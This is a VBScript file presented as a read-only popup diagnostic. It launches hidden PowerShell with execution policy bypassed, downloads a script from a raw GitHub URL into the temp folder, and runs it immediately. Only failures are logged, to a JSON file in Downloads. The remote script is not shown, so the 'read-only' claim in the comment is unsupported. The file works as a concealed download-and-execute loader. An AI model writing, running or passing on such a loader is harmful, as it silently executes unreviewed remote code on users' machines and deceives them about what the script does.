Option Explicit
' Read-only 90-second diagnostic. Starts only when double-clicked.
Dim shell, command
Set shell = CreateObject("WScript.Shell")
command = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & Chr(34)
command = command & "$ErrorActionPreference='Stop'; try { $tggFile=Join-Path $env:TEMP ('TGG-popup-'+[guid]::NewGuid().ToString('N')+'.ps1'); Invoke-WebRequest -UseBasicParsing -Uri"
command = command & " 'https://raw.githubusercontent.com/ducegood969-afktg/tggm/c5050a66b2234edc30c18a4af26e2ae70375359f/Diagnose-TGG-Popup.ps1' -OutFile $tggFile; & $tggFile } catc"
command = command & "h { @{status='failed';error=$_.Exception.Message} | ConvertTo-Json | Set-Content -LiteralPath (Join-Path $env:USERPROFILE 'Downloads\TGG-Popup-Diagnostic.json')"
command = command & " -Encoding UTF8 }"
command = command & Chr(34)
shell.Run command, 0, False
